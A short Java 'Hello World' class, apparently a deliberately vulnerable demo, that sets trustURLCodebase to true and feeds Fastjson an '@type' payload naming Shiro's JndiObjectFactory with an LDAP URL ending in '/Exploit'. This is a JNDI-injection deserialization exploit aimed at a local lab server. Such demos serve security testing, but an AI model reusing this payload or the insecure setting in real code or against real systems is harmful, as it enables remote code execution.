package com.jfrog.maven;

import com.alibaba.fastjson.JSON;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Hello world!
 */
public class AppSimple {

    private static final Logger logger = LogManager.getLogger(AppSimple.class);

    public static void main(String[] args) {

        logger.info("Hello World!");
        logger.info("Hello JFrog artifactory！");

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";

        JSON jsonObject = JSON.parseObject(payload);

        logger.info(jsonObject);
        logger.info("code end");
    }

    public String sayHello(String input){
        String str = "Hello " + input + "!";
        return str;
    }
}
